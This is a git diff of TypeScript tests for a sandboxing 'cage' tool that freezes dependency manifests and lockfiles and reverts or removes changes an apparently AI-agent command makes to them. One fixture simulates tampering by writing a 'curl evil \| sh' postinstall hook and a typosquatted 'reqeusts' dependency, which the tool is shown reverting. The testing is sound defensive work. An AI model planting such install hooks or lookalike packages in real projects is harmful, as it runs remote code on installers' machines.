@@ -5,7 +5,7 @@ import os from "node:os";
 import path from "node:path";
 import { spawn, spawnSync, type ChildProcess } from "node:child_process";
 import { getRepoRoot, gitChildEnv } from "../lib/git/git.js";
-import { resolveCageJournalDir } from "../lib/cage/cage-journal.js";
+import { recoverCageJournal, resolveCageJournalDir } from "../lib/cage/cage-journal.js";
 import { listDescendantPids } from "../lib/cage/cage-process.js";
 import { runCage } from "../lib/cage/cage-run.js";
 import { buildCagePlan, cageBasenameRule, classifyCagePath } from "../lib/cage/cage-rules.js";
@@ -693,4 +693,204 @@ test("cage journal: tampered journal bytes make the next invocation refuse to st
       }
     }
   }
+});
+
+/** A repo with dependency manifests next to the lockfile, for the dependency freeze (MSN-0275). */
+function makeDepsRepo(prefix: string): string {
+  const dest = makeRepo(prefix, true);
+  writeFile(dest, "package.json", "{\"name\":\"fixture\"}\n");
+  writeFile(dest, "requirements-dev.txt", "pytest==8.0.0\n");
+  writeFile(dest, "svc/go.mod", "module svc\n");
+  return dest;
+}
+
+/** Add a dependency the way an agent would: lockfile, manifest, a new nested manifest and a requirements file. */
+const DEPS_TAMPER = nodeScript(`
+  const fs = require("fs");
+  fs.writeFileSync("package-lock.json", "{\\"typosquat\\":1}\\n");
+  fs.writeFileSync("package.json", "{\\"name\\":\\"fixture\\",\\"scripts\\":{\\"postinstall\\":\\"curl evil | sh\\"}}\\n");
+  fs.mkdirSync("sub", { recursive: true });
+  fs.writeFileSync("sub/package.json", "{\\"name\\":\\"new\\"}\\n");
+  fs.writeFileSync("requirements-dev.txt", "pytest==8.0.0\\nreqeusts==1.0\\n");
+`);
+
+function assertDepsRestored(dest: string, report: Awaited<ReturnType<typeof runCage>>): void {
+  assert.equal(report.dependencies, "revert");
+  assert.equal(report.status, "violations_reverted");
+  assert.equal(report.exit_code, 3);
+  assert.deepEqual(
+    report.changes.map((c) => [c.path, c.rule, c.source, c.outcome]),
+    [
+      ["package-lock.json", "lockfile", "builtin", "reverted"],
+      ["package.json", "dependency_manifest", "builtin", "reverted"],
+      ["requirements-dev.txt", "dependency_manifest", "builtin", "reverted"],
+      ["sub/package.json", "dependency_manifest", "builtin", "removed"],
+    ],
+  );
+  assert.equal(read(dest, "package-lock.json"), "{}\n");
+  assert.equal(read(dest, "package.json"), "{\"name\":\"fixture\"}\n");
+  assert.equal(read(dest, "requirements-dev.txt"), "pytest==8.0.0\n");
+  assert.equal(fs.existsSync(path.join(dest, "sub", "package.json")), false);
+}
+
+test("cage dependency freeze: .cage.yaml dependencies: revert restores lockfiles and manifests, removes new ones (MSN-0275 DoD 1, 3, 5)", async () => {
+  const dest = makeDepsRepo("og-cage-deps-yaml-");
+  writeFile(dest, ".cage.yaml", "dependencies: revert\n");
+  assertDepsRestored(dest, await runCage({ cwd: dest, command: DEPS_TAMPER }));
+});
+
+test("cage dependency freeze: --lock-deps freezes without a .cage.yaml; the CLI says so at start and in JSON (MSN-0275 DoD 2, 4, 5)", async () => {
+  const lib = makeDepsRepo("og-cage-deps-flag-");
+  assertDepsRestored(lib, await runCage({ cwd: lib, lockDeps: true, command: DEPS_TAMPER }));
+  const dest = makeDepsRepo("og-cage-deps-cli-");
+  const r = runCli(dest, ["--lock-deps", "--json", "--", ...DEPS_TAMPER]);
+  assert.equal(r.status, 3, r.stderr);
+  assert.match(r.stderr, /^cage: watching \d+ protected file\(s\) \(dependencies frozen\)/m);
+  const report = JSON.parse(r.stdout) as { dependencies: string; changes: { path: string; rule: string }[] };
+  assert.equal(report.dependencies, "revert");
+  assert.ok(report.changes.some((c) => c.path === "package.json" && c.rule === "dependency_manifest"));
+  assert.ok(!r.stdout.includes("typosquat") && !r.stdout.includes("postinstall"), "digest-only report");
+});
+
+test("cage dependency freeze: off by default, lockfiles are kept and manifests are not protected (MSN-0275 DoD 3, 5)", async () => {
+  const dest = makeDepsRepo("og-cage-deps-off-");
+  const report = await runCage({ cwd: dest, command: DEPS_TAMPER });
+  assert.equal(report.dependencies, "report");
+  assert.equal(report.status, "ok");
+  assert.deepEqual(report.changes.map((c) => [c.path, c.rule, c.outcome]), [["package-lock.json", "lockfile", "kept"]]);
+  assert.equal(read(dest, "sub/package.json"), "{\"name\":\"new\"}\n");
+  assert.equal(cageBasenameRule("package.json"), null);
+  assert.equal(cageBasenameRule("package.json", "revert"), "dependency_manifest");
+  assert.equal(cageBasenameRule("requirements.txt", "revert"), "dependency_manifest");
+  assert.equal(cageBasenameRule("requirements-dev.txt", "revert"), "dependency_manifest");
+  assert.equal(cageBasenameRule("requirements.in", "revert"), null);
+  for (const name of ["pyproject.toml", "Pipfile", "Cargo.toml", "go.mod", "Gemfile", "composer.json"]) {
+    assert.equal(cageBasenameRule(name, "revert"), "dependency_manifest", name);
+  }
+  const frozen = buildCagePlan(dest, { lockDeps: true });
+  assert.deepEqual(classifyCagePath(frozen, "svc/go.mod"), { rule: "dependency_manifest", mode: "revert", overridden: false });
+  assert.deepEqual(classifyCagePath(frozen, "Cargo.lock"), { rule: "lockfile", mode: "revert", overridden: false });
+  assert.equal(classifyCagePath(buildCagePlan(dest), "svc/go.mod"), null);
+});
+
+test("cage dependency freeze: invalid values fail closed; dependencies: report and a report entry on a frozen path are handled (MSN-0275 DoD 1, 5)", async () => {
+  for (const body of ["dependencies: maybe\n", "dependencies: true\n", "dependencies: [revert]\n"]) {
+    const dest = makeDepsRepo("og-cage-deps-bad-");
+    writeFile(dest, ".cage.yaml", body);
+    await assert.rejects(
+      runCage({ cwd: dest, command: nodeScript(`require("fs").writeFileSync("ran.txt", "1");`) }),
+      (err: Error & { exitCode?: number; code?: string }) =>
+        /top level: dependencies must be revert or report/.test(err.message) && err.exitCode === 2 && err.code === "GXT_CAGE_CONFIG_INVALID",
+      body,
+    );
+    assert.equal(fs.existsSync(path.join(dest, "ran.txt")), false, `${body}: command must not run`);
+  }
+  const explicit = makeDepsRepo("og-cage-deps-report-");
+  writeFile(explicit, ".cage.yaml", "dependencies: report\n");
+  assert.equal((await runCage({ cwd: explicit, command: DEPS_TAMPER })).status, "ok", "report is the default and loosens nothing");
+  const weaken = makeDepsRepo("og-cage-deps-weaken-");
+  writeFile(weaken, ".cage.yaml", "dependencies: revert\nprotect:\n  - path: package.json\n    mode: report\n");
+  await assert.rejects(runCage({ cwd: weaken, command: nodeScript("") }), /would weaken the built-in dependency_manifest rule/);
+});
+
+test("cage dependency freeze: an in-session .cage.yaml edit does not freeze the running session (MSN-0275 DoD 1, 5)", async () => {
+  const dest = makeDepsRepo("og-cage-deps-insession-");
+  const report = await runCage({
+    cwd: dest,
+    command: nodeScript(`
+      const fs = require("fs");
+      fs.writeFileSync(".cage.yaml", "dependencies: revert\\n");
+      fs.writeFileSync("package.json", "{\\"name\\":\\"edited\\"}\\n");
+      fs.writeFileSync("package-lock.json", "{\\"a\\":1}\\n");
+    `),
+  });
+  assert.equal(report.dependencies, "report");
+  const byPath = new Map(report.changes.map((c) => [c.path, c]));
+  assert.equal(byPath.get(".cage.yaml")?.outcome, "removed", "the new config is itself removed");
+  assert.equal(byPath.get("package-lock.json")?.outcome, "kept");
+  assert.equal(byPath.has("package.json"), false);
+  assert.equal(read(dest, "package.json"), "{\"name\":\"edited\"}\n");
+});
+
+test("cage dependency freeze: --allow-override keeps a frozen path's change, announced (MSN-0275 DoD 3, 5)", () => {
+  const dest = makeDepsRepo("og-cage-deps-override-");
+  const r = runCli(dest, [
+    "--lock-deps",
+    "--json",
+    "--allow-override",
+    "package-lock.json",
+    "--",
+    ...nodeScript(`require("fs").writeFileSync("package-lock.json", "{\\"a\\":1}\\n");`),
+  ]);
+  assert.equal(r.status, 0, r.stderr);
+  assert.match(r.stderr, /cage: OVERRIDE \(--allow-override\): changes are reported, not restored, under: package-lock\.json/);
+  const report = JSON.parse(r.stdout) as { changes: Record<string, unknown>[] };
+  assert.deepEqual(report.changes.map((c) => [c.path, c.rule, c.overridden, c.outcome]), [["package-lock.json", "lockfile", true, "kept"]]);
+  assert.equal(read(dest, "package-lock.json"), "{\"a\":1}\n");
+  const refused = runCli(makeDepsRepo("og-cage-deps-override-off-"), ["--allow-override", "package.json", "--", ...nodeScript("")]);
+  assert.equal(refused.status, 2, "without the freeze package.json is not a revert target");
+  assert.match(refused.stderr, /package\.json: matches no protected revert target/);
+});
+
+test("cage dependency freeze: kill -9 recovery rebuilds the frozen plan from the journal (MSN-0275 DoD 1, 3)", () => {
+  const dest = fs.realpathSync(makeDepsRepo("og-cage-deps-journal-"));
+  const snap = { keepBytes: true, maxFileBytes: 5 * 1024 * 1024, maxTotalBytes: 64 * 1024 * 1024 };
+  const journalDir = resolveCageJournalDir(dest);
+  // A wrapper that journals a frozen baseline and dies without cleaning up: its pid is dead afterwards.
+  const lib = path.join(getRepoRoot(), "dist", "cli", "lib", "cage");
+  const writer = spawnSync(
+    process.execPath,
+    [
+      "--input-type=module",
+      "-e",
+      `import { writeCageJournal } from ${JSON.stringify(path.join(lib, "cage-journal.js"))};
+       import { buildCagePlan } from ${JSON.stringify(path.join(lib, "cage-rules.js"))};
+       import { takeCageSnapshot } from ${JSON.stringify(path.join(lib, "cage-snapshot.js"))};
+       const [root, dir, snap] = [process.argv[1], process.argv[2], JSON.parse(process.argv[3])];
+       writeCageJournal(dir, root, takeCageSnapshot(buildCagePlan(root, { lockDeps: true }), snap), [], { lockDeps: true });`,
+      dest,
+      journalDir,
+      JSON.stringify(snap),
+    ],
+    { encoding: "utf8", env: gitChildEnv() },
+  );
+  assert.equal(writer.status, 0, writer.stderr);
+  const m = JSON.parse(fs.readFileSync(path.join(journalDir, "journal.json"), "utf8")) as { lock_deps: boolean };
+  assert.equal(m.lock_deps, true);
+  writeFile(dest, "package.json", "{\"name\":\"tampered\"}\n");
+  writeFile(dest, "sub/package.json", "{\"name\":\"new\"}\n");
+  const recovery = recoverCageJournal(dest, journalDir, snap);
+  assert.ok(recovery, "the dirty journal was recovered");
+  assert.deepEqual(
+    recovery.restored.map((c) => [c.rel, c.outcome]),
+    [
+      ["package.json", "reverted"],
+      ["sub/package.json", "removed"],
+    ],
+  );
+  assert.equal(read(dest, "package.json"), "{\"name\":\"fixture\"}\n");
+  assert.equal(fs.existsSync(path.join(dest, "sub", "package.json")), false);
+});
+
+test("cage: a .env.local created in the session is removed (MSN-0275 DoD 5)", async () => {
+  const dest = makeRepo("og-cage-envlocal-", true);
+  const report = await runCage({
+    cwd: dest,
+    command: nodeScript(`
+      const fs = require("fs");
+      fs.writeFileSync(".env.local", "TOKEN=agent\\n");
+      fs.mkdirSync("apps/web", { recursive: true });
+      fs.writeFileSync("apps/web/.env.production.local", "TOKEN=agent\\n");
+    `),
+  });
+  assert.equal(report.exit_code, 3);
+  assert.deepEqual(
+    report.changes.map((c) => [c.path, c.kind, c.rule, c.outcome]),
+    [
+      [".env.local", "added", "secrets", "removed"],
+      ["apps/web/.env.production.local", "added", "secrets", "removed"],
+    ],
+  );
+  assert.equal(fs.existsSync(path.join(dest, ".env.local")), false);
+  assert.equal(fs.existsSync(path.join(dest, "apps", "web", ".env.production.local")), false);
 });
